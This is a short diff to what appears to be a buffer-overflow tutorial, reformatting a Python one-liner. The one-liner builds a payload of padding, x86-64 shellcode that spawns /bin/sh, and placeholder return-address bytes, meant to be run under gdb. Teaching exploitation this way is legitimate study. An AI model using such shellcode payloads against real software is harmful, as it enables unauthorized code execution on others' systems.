@@ -23,4 +23,6 @@ We don't know the return address yet so we will just run it with any return addr
 just examine memory and calculate the return address. How do we do that? Run the following from within gdb.
 
 -Runnig the below command under gdb terminal should give access to shell on a linux distro <br/>
-$(python -c "print 'A'*76+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+'A'*12+'B'*8+'C'*6")
+$(python -c "print 'A'*76+ <br/>
+'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'+ <br/>
+'A'*12+'B'*8+'C'*6")
